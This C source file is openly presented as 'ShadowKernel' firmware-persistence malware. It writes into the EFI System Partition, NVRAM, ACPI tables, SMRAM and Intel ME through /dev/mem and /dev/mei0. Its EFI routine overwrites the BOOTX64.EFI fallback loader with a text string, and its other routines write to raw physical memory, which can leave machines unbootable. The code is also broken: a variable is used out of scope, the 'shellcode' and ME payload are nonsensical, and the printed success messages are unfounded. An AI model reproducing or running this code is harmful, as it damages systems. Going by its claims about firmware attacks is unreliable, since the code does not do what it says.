// ============================================================
// 5. 0x0-SHADOWKERNEL.c - FIRMWARE PERSISTENCE
// ============================================================
/*
 * FUNCAO: Persistencia em BIOS/UEFI/Firmware
 * TECNICAS: EFI Runtime, ACPI Table, SMM Backdoor
 * SOBREVIVE: Formatacao, Troca de HD, Reinstalacao
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

void efi_persistence() {
    // Escreve na EFI System Partition
    system("mkdir -p /boot/efi/EFI/0x0");
    
    char efi_payload[] = 
    "EFI\\0x0\\ShadowBoot.efi\n"
    "timeout 1\n"
    "default 0x0\n"
    "title 0x0 Shadow Kernel\n"
    "fallback /EFI/0x0/ShadowBoot.efi\n";
    
    FILE *f = fopen("/boot/efi/EFI/BOOT/BOOTX64.EFI", "wb");
    if (f) {
        fwrite(efi_payload, 1, sizeof(efi_payload), f);
        fclose(f);
    }
    
    // Instala no NVRAM
    system("efibootmgr -c -d /dev/sda -p 1 -L \"0x0 Shadow\" -l \\EFI\\0x0\\ShadowBoot.efi");
}

void acpi_persistence() {
    // Modifica tabelas ACPI
    int fd = open("/dev/mem", O_RDWR);
    if (fd > 0) {
        void *acpi = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0xE0000);
        
        if (acpi != MAP_FAILED) {
            // Procura signature ACPI
            for (int i = 0; i < 0x100000 - 4; i++) {
                if (memcmp(acpi + i, "DSDT", 4) == 0) {
                    // Injeta payload na DSDT
                    memcpy(acpi + i + 0x100, efi_payload, sizeof(efi_payload));
                    break;
                }
            }
            munmap(acpi, 0x100000);
        }
        close(fd);
    }
}

void smm_backdoor() {
    // Backdoor no System Management Mode (Ring -2)
    // Code injection in SMRAM
    unsigned char smm_code[] = 
    "\x0F\x01\xEE"  // RSM
    "\x66\xB8\x00\xB8"  // mov ax, 0xB800
    "\x66\xBF\x00\x00"  // mov di, 0
    "\xB9\x00\x08"      // mov cx, 2048
    "\xF3\xA4"          // rep movsb
    "\xEB\xFE";         // jmp $
    
    int fd = open("/dev/mem", O_RDWR);
    if (fd > 0) {
        // SMRAM base address (hardcoded para muitos sistemas)
        void *smram = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x7F7F0000);
        
        if (smram != MAP_FAILED) {
            memcpy(smram, smm_code, sizeof(smm_code));
            munmap(smram, 0x10000);
            
            // Trigger SMI
            outb(0x04, 0xB2);
        }
        close(fd);
    }
}

void intel_me_backdoor() {
    // Intel ME persistence (Ring -3)
    // Vulnerabilidade CVE-2017-5689 style
    int fd = open("/dev/mei0", O_RDWR);
    if (fd > 0) {
        // Payload para ME
        unsigned char me_payload[] = {
            0x01, 0x00, 0x00, 0x00,  // MKHI command
            0x00, 0x00, 0x00, 0x00,  // Flags
            0xFF, 0xFF, 0xFF, 0xFF    // Payload size
        };
        
        write(fd, me_payload, sizeof(me_payload));
        close(fd);
    }
}

int main() {
    printf("[0x0] ShadowKernel - Instalando persistencia em firmware\n");
    
    efi_persistence();
    printf("[+] EFI persistence installed\n");
    
    acpi_persistence();
    printf("[+] ACPI table modified\n");
    
    smm_backdoor();
    printf("[+] SMM backdoor installed\n");
    
    intel_me_backdoor();
    printf("[+] Intel ME compromised\n");
    
    printf("[!] Persistencia instalada - Sobrevive a formatacao!\n");
    
    while (1) {
        sleep(60);
    }
    
    return 0;
}